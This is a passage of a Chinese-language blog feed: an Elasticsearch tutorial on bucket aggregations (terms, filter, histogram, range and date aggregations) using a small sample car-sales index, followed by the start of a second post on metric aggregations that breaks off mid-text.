        <content type="html"><![CDATA[<h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p><strong>Bucket</strong> 可以理解为一个桶，它会遍历文档中的内容，凡是符合某一要求的就放入一个桶中，分桶相当与 SQL 中的 <strong>group by</strong>。</p><p>这篇博客讲的桶的关键字有：<code>Terms Aggregation</code> 、<code>Filter Aggregation</code>、<code>Histogram Aggregation</code>、<code>Range Aggregation</code> 、<code>Date Aggregation</code>。</p><h2 id="一、创建索引、数据"><a href="#一、创建索引、数据" class="headerlink" title="一、创建索引、数据"></a>一、创建索引、数据</h2><h4 id="1、创建索引"><a href="#1、创建索引" class="headerlink" title="1、创建索引"></a>1、创建索引</h4><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">DELETE cars</span><br><span class="line">PUT cars</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"mappings"</span>: &#123;</span><br><span class="line">      <span class="attr">"properties"</span>: &#123;</span><br><span class="line">        <span class="attr">"price"</span>: &#123;</span><br><span class="line">          <span class="attr">"type"</span>:<span class="string">"long"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"color"</span>: &#123;</span><br><span class="line">          <span class="attr">"type"</span>:<span class="string">"keyword"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"brand"</span>: &#123;</span><br><span class="line">          <span class="attr">"type"</span>:<span class="string">"keyword"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"sellTime"</span>: &#123;</span><br><span class="line">          <span class="attr">"type"</span>:<span class="string">"date"</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>属性字段：价格、颜色、品牌、销售时间</strong></p><h4 id="2、添加索引数据"><a href="#2、添加索引数据" class="headerlink" title="2、添加索引数据"></a>2、添加索引数据</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST /cars/_bulk</span><br><span class="line">&#123; <span class="string">"index"</span>: &#123;&#125;&#125;</span><br><span class="line">&#123; <span class="string">"price"</span> : 80000, <span class="string">"color"</span> : <span class="string">"red"</span>, <span class="string">"brand"</span> : <span class="string">"BMW"</span>, <span class="string">"sellTime"</span> : <span class="string">"2014-01-28"</span> &#125;</span><br><span class="line">&#123; <span class="string">"index"</span>: &#123;&#125;&#125;</span><br><span class="line">&#123; <span class="string">"price"</span> : 85000, <span class="string">"color"</span> : <span class="string">"green"</span>, <span class="string">"brand"</span> : <span class="string">"BMW"</span>, <span class="string">"sellTime"</span> : <span class="string">"2014-02-05"</span> &#125;</span><br><span class="line">&#123; <span class="string">"index"</span>: &#123;&#125;&#125;</span><br><span class="line">&#123; <span class="string">"price"</span> : 120000, <span class="string">"color"</span> : <span class="string">"green"</span>, <span class="string">"brand"</span> : <span class="string">"Mercedes"</span>, <span class="string">"sellTime"</span> : <span class="string">"2014-03-18"</span> &#125;</span><br><span class="line">&#123; <span class="string">"index"</span>: &#123;&#125;&#125;</span><br><span class="line">&#123; <span class="string">"price"</span> : 105000, <span class="string">"color"</span> : <span class="string">"blue"</span>, <span class="string">"brand"</span> : <span class="string">"Mercedes"</span>, <span class="string">"sellTime"</span> : <span class="string">"2014-04-02"</span> &#125;</span><br><span class="line">&#123; <span class="string">"index"</span>: &#123;&#125;&#125;</span><br><span class="line">&#123; <span class="string">"price"</span> : 72000, <span class="string">"color"</span> : <span class="string">"green"</span>, <span class="string">"brand"</span> : <span class="string">"Audi"</span>, <span class="string">"sellTime"</span> : <span class="string">"2014-05-19"</span> &#125;</span><br><span class="line">&#123; <span class="string">"index"</span>: &#123;&#125;&#125;</span><br><span class="line">&#123; <span class="string">"price"</span> : 60000, <span class="string">"color"</span> : <span class="string">"red"</span>, <span class="string">"brand"</span> : <span class="string">"Audi"</span>, <span class="string">"sellTime"</span> : <span class="string">"2014-06-05"</span> &#125;</span><br><span class="line">&#123; <span class="string">"index"</span>: &#123;&#125;&#125;</span><br><span class="line">&#123; <span class="string">"price"</span> : 40000, <span class="string">"color"</span> : <span class="string">"red"</span>, <span class="string">"brand"</span> : <span class="string">"Audi"</span>, <span class="string">"sellTime"</span> : <span class="string">"2014-07-01"</span> &#125;</span><br><span class="line">&#123; <span class="string">"index"</span>: &#123;&#125;&#125;</span><br><span class="line">&#123; <span class="string">"price"</span> : 35000, <span class="string">"color"</span> : <span class="string">"blue"</span>, <span class="string">"brand"</span> : <span class="string">"Honda"</span>, <span class="string">"sellTime"</span> : <span class="string">"2014-08-12"</span> &#125;</span><br></pre></td></tr></table></figure><h4 id="3、查看是否成功"><a href="#3、查看是否成功" class="headerlink" title="3、查看是否成功"></a>3、查看是否成功</h4><p><strong>命令</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /_cat/count/cars?v</span><br></pre></td></tr></table></figure><p>可以看到该索引存在，并且有8条文档数据。</p><p><img src="/img/es/es6-0.png" alt="es"> </p><h2 id="二、Terms-Aggregation"><a href="#二、Terms-Aggregation" class="headerlink" title="二、Terms Aggregation"></a>二、Terms Aggregation</h2><p><strong>官方7.3文档</strong>：<a href="https://www.elastic.co/guide/en/elasticsearch/reference/current/search-aggregations-bucket-terms-aggregation.html" target="_blank" rel="noopener">Terms Aggregation</a></p><p><code>概念</code> : 根据某一项的每个唯一的值的聚合。</p><h4 id="1、根据品牌分桶"><a href="#1、根据品牌分桶" class="headerlink" title="1、根据品牌分桶"></a>1、根据品牌分桶</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET cars/_search?size=0</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">"aggs"</span> : &#123;</span><br><span class="line">        <span class="string">"genres"</span> : &#123;</span><br><span class="line">            <span class="string">"terms"</span> : &#123; <span class="string">"field"</span> : <span class="string">"brand"</span> &#125; </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>返回结果</p><p><img src="/img/es/es6-1.png" alt="es"> </p><h4 id="2、分桶后只显示文档数量前3的桶"><a href="#2、分桶后只显示文档数量前3的桶" class="headerlink" title="2、分桶后只显示文档数量前3的桶"></a>2、分桶后只显示文档数量前3的桶</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET cars/_search?size=0</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">"aggs"</span> : &#123;</span><br><span class="line">        <span class="string">"cars"</span> : &#123;</span><br><span class="line">            <span class="string">"terms"</span> : &#123;</span><br><span class="line">                <span class="string">"field"</span> : <span class="string">"brand"</span>,</span><br><span class="line">                <span class="string">"size"</span> : 3</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>返回</p><p><img src="/img/es/es6-2.png" alt="es"> </p><p>从图中可以看出文档数量前三的桶。</p><h4 id="3、分桶后排序"><a href="#3、分桶后排序" class="headerlink" title="3、分桶后排序"></a>3、分桶后排序</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET cars/_search?size=0</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">"aggs"</span> : &#123;</span><br><span class="line">        <span class="string">"genres"</span> : &#123;</span><br><span class="line">            <span class="string">"terms"</span> : &#123;</span><br><span class="line">                <span class="string">"field"</span> : <span class="string">"brand"</span>,</span><br><span class="line">                <span class="string">"order"</span> : &#123; <span class="string">"_count"</span> : <span class="string">"asc"</span> &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="4、显示文档数量大于3的桶"><a href="#4、显示文档数量大于3的桶" class="headerlink" title="4、显示文档数量大于3的桶"></a>4、显示文档数量大于3的桶</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET cars/_search?size=0</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">"aggs"</span> : &#123;</span><br><span class="line">        <span class="string">"brands"</span> : &#123;</span><br><span class="line">            <span class="string">"terms"</span> : &#123;</span><br><span class="line">                <span class="string">"field"</span> : <span class="string">"brand"</span>,</span><br><span class="line">                <span class="string">"min_doc_count"</span>: 3</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="5、使用精确指定的词条进行分桶"><a href="#5、使用精确指定的词条进行分桶" class="headerlink" title="5、使用精确指定的词条进行分桶"></a>5、使用精确指定的词条进行分桶</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET /cars/_search?size=0</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">"aggs"</span> : &#123;</span><br><span class="line">        <span class="string">"JapaneseCars"</span> : &#123;</span><br><span class="line">             <span class="string">"terms"</span> : &#123;</span><br><span class="line">                 <span class="string">"field"</span> : <span class="string">"brand"</span>,</span><br><span class="line">                 <span class="string">"include"</span> : [<span class="string">"BMW"</span>, <span class="string">"Audi"</span>]</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里也只展示些常用的，更多有关Terms Aggregation那就看官网吧。</p><h2 id="三、-Filter-Aggregation"><a href="#三、-Filter-Aggregation" class="headerlink" title="三、 Filter Aggregation"></a>三、 Filter Aggregation</h2><p><strong>官方文档</strong>： <a href="https://www.elastic.co/guide/en/elasticsearch/reference/current/search-aggregations-bucket-filter-aggregation.html" target="_blank" rel="noopener">Filter Aggregation</a> 和 <a href="https://www.elastic.co/guide/en/elasticsearch/reference/current/search-aggregations-bucket-filters-aggregation.html" target="_blank" rel="noopener">Filters Aggregation</a></p><p><code>Filter概念</code>：指具体的域和具体的值，可以说是在 Terms Aggregation 的基础上进行了过滤，只对特定的值进行了聚合。</p><h4 id="1、过滤获取品牌为BMW的桶，并求该桶平均值"><a href="#1、过滤获取品牌为BMW的桶，并求该桶平均值" class="headerlink" title="1、过滤获取品牌为BMW的桶，并求该桶平均值"></a>1、过滤获取品牌为BMW的桶，并求该桶平均值</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET /cars/_search?size=0</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">"aggs"</span> : &#123;</span><br><span class="line">        <span class="string">"brands"</span> : &#123;</span><br><span class="line">            <span class="string">"filter"</span> : &#123; <span class="string">"term"</span>: &#123; <span class="string">"brand"</span>: <span class="string">"BMW"</span> &#125; &#125;,</span><br><span class="line">            <span class="string">"aggs"</span> : &#123;</span><br><span class="line">                <span class="string">"avg_price"</span> : &#123; <span class="string">"avg"</span> : &#123; <span class="string">"field"</span> : <span class="string">"price"</span> &#125; &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>返回</p><p><img src="/img/es/es6-3.png" alt="es"> </p><h4 id="2、过滤获取品牌为BMW的或者color为绿色的桶"><a href="#2、过滤获取品牌为BMW的或者color为绿色的桶" class="headerlink" title="2、过滤获取品牌为BMW的或者color为绿色的桶"></a>2、过滤获取品牌为BMW的或者color为绿色的桶</h4><p><code>Filters概念</code> : Filter Aggreagtion 只能指定一个过滤条件，响应也只是单个桶。如果想要只对多个特定值进行聚合，使用 Filter Aggreagtion 只能进行多次请求。</p><p>而使用 Filters Aggreagation 就可以解决上述的问题，它可以指定多个过滤条件，也是说可以对多个特定值进行聚合。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">GET /cars/_search?size=0</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">"size"</span>: 0,</span><br><span class="line">  <span class="string">"aggs"</span> : &#123;</span><br><span class="line">    <span class="string">"cars"</span> : &#123;</span><br><span class="line">      <span class="string">"filters"</span> : &#123;</span><br><span class="line">        <span class="string">"filters"</span> : &#123;</span><br><span class="line">          <span class="string">"colorBucket"</span> :   &#123; <span class="string">"match"</span> : &#123; <span class="string">"color"</span> : <span class="string">"red"</span>   &#125;&#125;,</span><br><span class="line">          <span class="string">"brandBucket"</span> : &#123; <span class="string">"match"</span> : &#123; <span class="string">"brand"</span> : <span class="string">"Audi"</span> &#125;&#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>返回</p><p><img src="/img/es/es6-4.png" alt="es"> </p><h2 id="四、Histogram-Aggreagtion"><a href="#四、Histogram-Aggreagtion" class="headerlink" title="四、Histogram Aggreagtion"></a>四、Histogram Aggreagtion</h2><p><strong>官方文档</strong>：<a href="https://www.elastic.co/guide/en/elasticsearch/reference/current/search-aggregations-bucket-histogram-aggregation.html" target="_blank" rel="noopener">Histogram Aggreagtion</a></p><p><code>概念</code> Histogram与Terms聚合类似，都是数据分组，区别是Terms是按照Field的值分组，而Histogram可以按照指定的间隔对Field进行分组</p><h4 id="1、根据价格区间为10000分桶"><a href="#1、根据价格区间为10000分桶" class="headerlink" title="1、根据价格区间为10000分桶"></a>1、根据价格区间为10000分桶</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET /cars/_search?size=0</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">"aggs"</span> : &#123;</span><br><span class="line">        <span class="string">"prices"</span> : &#123;</span><br><span class="line">            <span class="string">"histogram"</span> : &#123;</span><br><span class="line">                <span class="string">"field"</span> : <span class="string">"price"</span>,</span><br><span class="line">                <span class="string">"interval"</span> : 10000</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>返回</p><p><img src="/img/es/es6-5.png" alt="es"> </p><h4 id="2、根据价格区间为10000分桶，同时如果桶中没有文档就不显示桶"><a href="#2、根据价格区间为10000分桶，同时如果桶中没有文档就不显示桶" class="headerlink" title="2、根据价格区间为10000分桶，同时如果桶中没有文档就不显示桶"></a>2、根据价格区间为10000分桶，同时如果桶中没有文档就不显示桶</h4><p>上面的分桶我们可以发现价格在5000～6000 的文档没有也显示为0，我们想把如果桶中没有文档就不显示该桶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">GET /cars/_search?size=0</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">"aggs"</span> : &#123;</span><br><span class="line">        <span class="string">"prices"</span> : &#123;</span><br><span class="line">            <span class="string">"histogram"</span> : &#123;</span><br><span class="line">                <span class="string">"field"</span> : <span class="string">"price"</span>,</span><br><span class="line">                <span class="string">"interval"</span> : 10000,</span><br><span class="line">                 <span class="string">"min_doc_count"</span> : 1</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>返回</p><p><img src="/img/es/es6-6.png" alt="es"> </p><h2 id="五、Range-Aggregation"><a href="#五、Range-Aggregation" class="headerlink" title="五、Range Aggregation"></a>五、Range Aggregation</h2><p><strong>官方文档</strong>：<a href="https://www.elastic.co/guide/en/elasticsearch/reference/current/search-aggregations-bucket-range-aggregation.html" target="_blank" rel="noopener">Range Aggregation</a></p><p><code>概念</code>: 根据用户传递的范围参数作为桶，进行相应的聚合。在同一个请求中，可以传递多组范围，每组范围作为一个桶。</p><h4 id="1、根据价格区间分桶"><a href="#1、根据价格区间分桶" class="headerlink" title="1、根据价格区间分桶"></a>1、根据价格区间分桶</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">GET /cars/_search?size=0</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">"aggs"</span> : &#123;</span><br><span class="line">        <span class="string">"price_ranges"</span> : &#123;</span><br><span class="line">            <span class="string">"range"</span> : &#123;</span><br><span class="line">                <span class="string">"field"</span> : <span class="string">"price"</span>,</span><br><span class="line">                <span class="string">"ranges"</span> : [</span><br><span class="line">                    &#123; <span class="string">"to"</span> : 50000 &#125;,</span><br><span class="line">                    &#123; <span class="string">"from"</span> : 5000, <span class="string">"to"</span> : 80000 &#125;,</span><br><span class="line">                    &#123; <span class="string">"from"</span> : 80000 &#125;</span><br><span class="line">                ]</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>返回</p><p><img src="/img/es/es6-7.png" alt="es"> </p><p>我们也可以指定key的名称</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">GET /cars/_search?size=0</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">"aggs"</span> : &#123;</span><br><span class="line">        <span class="string">"price_ranges"</span> : &#123;</span><br><span class="line">            <span class="string">"range"</span> : &#123;</span><br><span class="line">                <span class="string">"field"</span> : <span class="string">"price"</span>,</span><br><span class="line">                <span class="string">"ranges"</span> : [</span><br><span class="line">                    &#123; <span class="string">"key"</span> : <span class="string">"xiaoyu"</span>,  <span class="string">"to"</span> : 50000 &#125;,</span><br><span class="line">                    &#123;  <span class="string">"key"</span> : <span class="string">"baohan"</span>, <span class="string">"from"</span> : 5000, <span class="string">"to"</span> : 80000 &#125;,</span><br><span class="line">                    &#123;  <span class="string">"key"</span> : <span class="string">"dayu"</span>, <span class="string">"from"</span> : 80000 &#125;</span><br><span class="line">                ]</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>返回</p><p><img src="/img/es/es6-8.png" alt="es"> </p><h2 id="六、-Date-Aggregation"><a href="#六、-Date-Aggregation" class="headerlink" title="六、 Date Aggregation"></a>六、 Date Aggregation</h2><p><strong>官方文档</strong>： <a href="https://www.elastic.co/guide/en/elasticsearch/reference/current/search-aggregations-bucket-datehistogram-aggregation.html" target="_blank" rel="noopener">Date Histogram Aggregation</a> 和 <a href="https://www.elastic.co/guide/en/elasticsearch/reference/current/search-aggregations-bucket-daterange-aggregation.html" target="_blank" rel="noopener">Date Range Aggregation</a></p><p><code>Date Histogram概念</code> 针对于时间格式数据的直方图聚合，基本的特性与 Histogram Aggregation 一致。</p><h4 id="1、按月分桶显示每个月的销量"><a href="#1、按月分桶显示每个月的销量" class="headerlink" title="1、按月分桶显示每个月的销量"></a>1、按月分桶显示每个月的销量</h4><p><code>注意</code> 官方文档这里不是interval而是calendar_interval，但是按照这样操作会报错，因为我看的7.3的文档，而我部署的es是7.1版本。说明这个地方7.3有了改进。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /cars/_search?size=0</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">"aggs"</span> : &#123;</span><br><span class="line">        <span class="string">"sales_over_time"</span> : &#123;</span><br><span class="line">            <span class="string">"date_histogram"</span> : &#123;</span><br><span class="line">                <span class="string">"field"</span> : <span class="string">"sellTime"</span>,</span><br><span class="line">                <span class="string">"interval"</span> : <span class="string">"1M"</span>,</span><br><span class="line">                <span class="string">"format"</span> : <span class="string">"yyyy-MM-dd"</span> </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>返回</p><p><img src="/img/es/es6-9.png" alt="es"> </p><h4 id="2、根据指定时间区间分桶"><a href="#2、根据指定时间区间分桶" class="headerlink" title="2、根据指定时间区间分桶"></a>2、根据指定时间区间分桶</h4><p><code>Date Range概念</code> ：针对于时间格式数据的范围聚合，基本的特性与 Range Aggreagtion 一致。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /cars/_search?size=0</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">"aggs"</span>: &#123;</span><br><span class="line">        <span class="string">"range"</span>: &#123;</span><br><span class="line">            <span class="string">"date_range"</span>: &#123;</span><br><span class="line">                <span class="string">"field"</span>: <span class="string">"sellTime"</span>,</span><br><span class="line">                <span class="string">"format"</span>: <span class="string">"MM-yyyy"</span>,</span><br><span class="line">                <span class="string">"ranges"</span>: [</span><br><span class="line">                    &#123; <span class="string">"to"</span>: <span class="string">"now-10M/M"</span> &#125;, </span><br><span class="line">                    &#123; <span class="string">"from"</span>: <span class="string">"now-10M/M"</span> &#125; </span><br><span class="line">                ]</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的意思是10个月前的分为一个桶，10个月前之后的分为一个桶</p><p><img src="/img/es/es6-10.png" alt="es"> </p>]]></content>
      
      
      <categories>
          
          <category> Elasticsearch </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Elasticsearch </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Elasticsearch——Metric聚合查询</title>
      <link href="/2023/10/08/Elasticsearch%E2%80%94%E2%80%94Metric%E8%81%9A%E5%90%88%E6%9F%A5%E8%AF%A2/"/>
      <url>/2023/10/08/Elasticsearch%E2%80%94%E2%80%94Metric%E8%81%9A%E5%90%88%E6%9F%A5%E8%AF%A2/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在Mysql中，我们可以获取一组数据的 <strong>最大值(Max)</strong>、<strong>最小值(Min)</strong>。同样我们能够对这组数据进行 <strong>分组(Group)</strong>。那么对于Elasticsearch中</p><p>我们也可以实现同样的功能，聚合有关资料官方文档内容较多，这里大概分两篇博客写这个有关Elasticsearch聚合。</p><p>官方对聚合有四个关键字: <code>Metric(指标）</code>、<code>Bucketing(桶）</code>、<code>Matrix(矩阵）</code>、<code>Pipeline(管道）</code>。</p><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><h4 id="1-ES聚合分析是什么？"><a href="#1-ES聚合分析是什么？" class="headerlink" title="1. ES聚合分析是什么？"></a>1. ES聚合分析是什么？</h4><p><code>概念</code> Elasticsearch除全文检索功能外提供的针对Elasticsearch数据做统计分析的功能。它的实时性高,所有的计算结果都是即时返回。<br>Elasticsearch将聚合分析主要分为如下4类：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">Metric(指标):   指标分析类型，如计算最大值、最小值、平均值等等 （对桶内的文档进行聚合分析的操作）</span></span><br><span class="line"><span class="section">Bucket(桶):     分桶类型，类似SQL中的GROUP BY语法 （满足特定条件的文档的集合）</span></span><br><span class="line"><span class="section">Pipeline(管道): 管道分析类型，基于上一级的聚合分析结果进行在分析</span></span><br><span class="line"><span class="section">Matrix(矩阵):   矩阵分析类型（聚合是一种面向数值型的聚合，用于计算一组文档字段中的统计信息）</span></span><br></pre></td></tr></table></figure><h4 id="2-ES聚合分析查询的写法"><a href="#2-ES聚合分析查询的写法" class="headerlink" title="2.ES聚合分析查询的写法"></a>2.ES聚合分析查询的写法</h4><p>在查询请求体中以aggregations节点按如下语法定义聚合分析：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"aggregations"</span> : &#123;</span><br><span class="line">    <span class="string">"&lt;aggregation_name&gt;"</span> : &#123;                                 &lt;!--聚合的名字 --&gt;</span><br><span class="line">        <span class="string">"&lt;aggregation_type&gt;"</span> : &#123;                               &lt;!--聚合的类型 --&gt;</span><br><span class="line">            &lt;aggregation_body&gt;                                 &lt;!--聚合体：对哪些字段进行聚合 --&gt;</span><br><span class="line">        &#125;</span><br><span class="line">        [,<span class="string">"meta"</span> : &#123;  [&lt;meta_data_body&gt;] &#125; ]?               &lt;!--元 --&gt;</span><br><span class="line">        [,<span class="string">"aggregations"</span> : &#123; [&lt;sub_aggregation&gt;]+ &#125; ]?   &lt;!--在聚合里面在定义子聚合 --&gt;</span><br><span class="line">    &#125;</span><br><span class="line">    [,<span class="string">"&lt;aggregation_name_2&gt;"</span> : &#123; ... &#125; ]*                     &lt;!--聚合的名字 --&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>说明</code>：<strong>aggregations 也可简写为 aggs</strong></p><h4 id="3、指标（metric）和-桶（bucket）"><a href="#3、指标（metric）和-桶（bucket）" class="headerlink" title="3、指标（metric）和 桶（bucket）"></a>3、指标（metric）和 桶（bucket）</h4><p>虽然Elasticsearch有四种聚合方式，但在一般实际开发中，用到的比较多的就是Metric和Bucket。</p><p><strong>（1） 桶（bucket）</strong>　　</p><p>　　a、简单来说桶就是满足特定条件的文档的集合。</p><p>　　b、当聚合开始被执行，每个文档里面的值通过计算来决定符合哪个桶的条件，如果匹配到，文档将放入相应的桶并接着开始聚合操作。</p><p>　　